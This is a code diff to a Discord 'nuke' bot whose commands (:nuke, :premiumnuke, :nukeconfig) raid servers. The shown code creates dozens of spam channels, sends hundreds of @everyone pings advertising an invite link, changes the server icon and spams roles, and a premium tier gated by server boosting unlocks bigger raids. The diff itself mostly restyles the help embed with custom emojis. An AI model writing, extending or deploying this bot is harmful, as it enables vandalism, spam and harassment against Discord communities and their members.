@@ -18,11 +18,16 @@ OWNER_ID = 1450919094202269881              # IMPORTANT: REPLACE THIS with your 
 NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
 PREMIUM_CHANNEL_NAME = "premium-raid"
 PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
-RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"
+RAID_ICON_URL = "https://tenor.com/view/mmt-error-error-old-data-fatal-error-inscryption-gif-6023676896000678543"
+
+# --- CUSTOM EMOJIS FOR HELP COMMAND ---
+EMOJI_LOCKED = "<:BackgroundEraser_20260106_164604:1458215277270405201>"
+EMOJI_UNLOCKED = "<:BackgroundEraser_20260106_164433:1458214866002378752>"
+EMOJI_VERIFIED = "<:BackgroundEraser_20260106_164323:1458214597571117264>"
+EMOJI_GEAR = "<:BackgroundEraser_20260106_163940:1458213801106346076>"
 
 # Bot setup
 intents = discord.Intents.all()
-# Remove the default help command to create our own
 bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)
 
 # --- PREMIUM CHECK FUNCTION ---
@@ -46,23 +51,23 @@ async def on_ready():
     print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
     print('Commands: :help, :nuke, :premiumnuke, :nukeconfig')
 
-# --- NEW AESTHETIC HELP COMMAND ---
+# --- AESTHETIC HELP COMMAND (UPDATED WITH EMOJIS) ---
 @bot.command(name='help')
 async def custom_help(ctx):
-    """Displays a professional help embed for the bot's commands."""
+    """Displays a professional help embed with custom emojis."""
     await ctx.message.delete()
 
     embed = discord.Embed(
-        title="Bot Command Manual",
+        title=f"Bot Command Manual {EMOJI_VERIFIED}",
         description="This bot provides both public and premium raiding capabilities.",
-        color=discord.Color.from_rgb(47, 49, 54) # Dark theme color
+        color=discord.Color.from_rgb(47, 49, 54)
     )
 
     # Public Commands
     embed.add_field(
         name="Public Commands",
         value=(
-            f"`:nuke`\n"
+            f"{EMOJI_UNLOCKED} `:nuke`\n"
             f"Initiates a standard raid. This command is public and has fixed parameters.\n"
             f"*Channels: 25, Pings: 500*"
         ),
@@ -73,32 +78,32 @@ async def custom_help(ctx):
     embed.add_field(
         name="Premium Commands",
         value=(
-            f"`:premiumnuke`\n"
+            f"{EMOJI_LOCKED} `:premiumnuke`\n"
             f"Initiates a much larger and more destructive raid with additional features.\n"
             f"*Channels: 50, Pings: 1000, Icon Change, Role Spam*\n\n"
-            f"`:nukeconfig <name> <text>`\n"
+            f"{EMOJI_GEAR} `:nukeconfig <name> <text>`\n"
             f"Configures the channel names and spam text for the `:premiumnuke` command."
         ),
         inline=False
     )
 
     embed.set_footer(text="Access to premium commands is granted by boosting the main server.")
-    embed.set_thumbnail(url="https://i.imgur.com/kair9A0.png") # You can change this to your bot's logo
+    embed.set_thumbnail(url="https://i.imgur.com/kair9A0.png")
 
     help_message = await ctx.send(embed=embed)
-    await asyncio.sleep(60) # The help message will be deleted after 60 seconds
+    await asyncio.sleep(60)
     await help_message.delete()
 
-# --- NUKE COMMANDS (WITH CORRECTED PARAMETERS) ---
+# (The rest of the code remains exactly the same)
+
+# --- NUKE COMMANDS ---
 @bot.command(name='nuke')
 async def nuke_normal(ctx):
-    """Public command: 25 channels, 500 pings."""
     if ctx.guild.id == CENTRAL_SERVER_ID:
         await ctx.send("Action Blocked: Nuke commands are disabled in this server.", delete_after=10)
         return
     if not ctx.guild.me.guild_permissions.administrator:
         return
-    
     print(f"Initiating STANDARD NUKE in: {ctx.guild.name} by {ctx.author.name}")
     await execute_nuke(ctx, "raid-by-del1rium", NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
     print(f"Standard Nuke finished for {ctx.guild.name}.")
@@ -106,13 +111,11 @@ async def nuke_normal(ctx):
 @bot.command(name='premiumnuke')
 @is_premium()
 async def premium_nuke(ctx):
-    """Premium command: 50 channels, 1000 pings."""
     if ctx.guild.id == CENTRAL_SERVER_ID:
         await ctx.send("Action Blocked: Nuke commands are disabled in this server.", delete_after=10)
         return
     if not ctx.guild.me.guild_permissions.administrator:
         return
-        
     print(f"Initiating PREMIUM NUKE in: {ctx.guild.name} by {ctx.author.name}")
     await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
     print(f"Premium Nuke finished for {ctx.guild.name}.")
@@ -121,14 +124,11 @@ async def premium_nuke(ctx):
 @bot.command(name='nukeconfig')
 @is_premium()
 async def nuke_config(ctx, channel_name: str, *, spam_text: str):
-    """Configures the text for the :premiumnuke command."""
     if ctx.guild.id == CENTRAL_SERVER_ID:
         await ctx.send("Command Disabled: This command cannot be used in the main server.", delete_after=10)
         return
-
     global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
     PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
-    
     await ctx.message.delete()
     embed = discord.Embed(title="Premium Nuke Configuration Updated", color=discord.Color.gold())
     embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
@@ -178,8 +178,10 @@ async def create_chaotic_roles(guild):
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
+        # The premium check already sends a message, so we just print to console.
         print(f"Premium access denied for user: {ctx.author.name}")
     else:
+        # Silently ignore other errors to keep the console clean.
         pass
 
 if __name__ == "__main__":
